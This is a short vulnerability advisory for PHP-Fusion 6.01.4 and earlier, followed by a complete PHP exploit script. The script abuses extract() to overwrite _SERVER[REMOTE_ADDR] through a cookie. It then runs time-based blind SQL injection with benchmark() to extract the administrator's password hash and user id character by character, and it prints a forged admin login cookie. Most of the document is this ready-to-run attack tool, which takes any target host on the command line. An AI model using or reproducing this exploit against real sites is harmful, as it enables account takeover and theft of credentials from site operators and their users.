source: http://www.securityfocus.com/bid/19908/info

PHP-Fusion is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query. 

A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.

#!/usr/bin/php -q -d short_open_tag=on

print_r('
--------------------------------------------------------------------------------
PHPFusion <= 6.01.4 extract()/_SERVER[REMOTE_ADDR] sql injection exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
--------------------------------------------------------------------------------
');
/*
works with
register globals = *Off*
magic_quotes_gpc = Off

explaination:
vulnerable code in maincore.php at lines 15-21:

...
if (ini_get('register_globals') != 1) {
	$supers = array("_REQUEST","_ENV","_SERVER","_POST","_GET","_COOKIE","_SESSION","_FILES","_GLOBALS");
	foreach ($supers as $__s) {
		if ((isset($$__s) == true) && (is_array($$__s) == true)) extract($$__s, EXTR_OVERWRITE);
	}
	unset($supers);
}
...

extract() function can be sometimes a security hazard, in this case it allows
to overwrite some arrays like _SERVER[] one and launch an sql injection attack,
ex:

http://[target]/[path]/news.php?_SERVER[REMOTE_ADDR]='[SQL]

other attacks may be possible...
*/

if ($argc<3) {
print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to PHPFusion
Options:
   -T[prefix:   specify a table prefix (default: fusion_)
   -p[port]:    specify a port other than 80
   -P[ip:port]: specify a proxy
Examples:
php '.$argv[0].' localhost /fusion/
php '.$argv[0].' localhost /fusion/ -p81
php '.$argv[0].' localhost / -P1.1.1.1:80
--------------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
   }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
$prefix="fusion_";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$password="";
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$chars))
{
$sql="1.1.1.999'/**/UNION/**/SELECT/**/IF((ASCII(SUBSTRING(user_password,".$j.",1))=".$i."),benchmark(2000000,sha1('sun-tzu')),0)/**/FROM/**/".$prefix."users/**/WHERE/**/user_level=103/*";
echo "sql -> ".$sql."\n";
$sql=urlencode($sql);
$packet="GET ".$p."news.php HTTP/1.0\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: _SERVER[REMOTE_ADDR]=$sql;\r\n";
$packet.="Connection: Close\r\n\r\n";
usleep(2000000);
$starttime=time();
sendpacketii($packet);
$endtime=time();
echo "starttime -> ".$starttime."\n";
echo "endtime -> ".$endtime."\n";
$difftime=$endtime - $starttime;
echo "difftime -> ".$difftime."\n";
if ($difftime > 10) {$password.=chr($i);echo "password -> ".$password."[???]\n";sleep(1);break;}

}
if ($i==255) {die("\nExploit failed...");}
}
$j++;
}

$chars[]="";
$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$j=1;$id="";
while (!strstr($id,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$chars))
{
$sql="1.1.1.999'/**/UNION/**/SELECT/**/IF((ASCII(SUBSTRING(user_id,".$j.",1))=".$i."),benchmark(2000000,sha1('sun-tzu')),0)/**/FROM/**/".$prefix."users/**/WHERE/**/user_level=103/*";
echo "sql -> ".$sql."\n";
$sql=urlencode($sql);
$packet="GET ".$p."news.php HTTP/1.0\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: _SERVER[REMOTE_ADDR]=$sql;\r\n";
$packet.="Connection: Close\r\n\r\n";
usleep(2000000);
$starttime=time();
sendpacketii($packet);
$endtime=time();
echo "starttime -> ".$starttime."\n";
echo "endtime -> ".$endtime."\n";
$difftime=$endtime - $starttime;
echo "difftime -> ".$difftime."\n";
if ($difftime > 10) {$id.=chr($i);echo "id -> ".$id."[???]\n";sleep(1);break;}

}
if ($i==255) {die("\nExploit failed...");}
}
$j++;
}
echo "admin cookie -> fusion_user=".trim($id).$password.";\n";
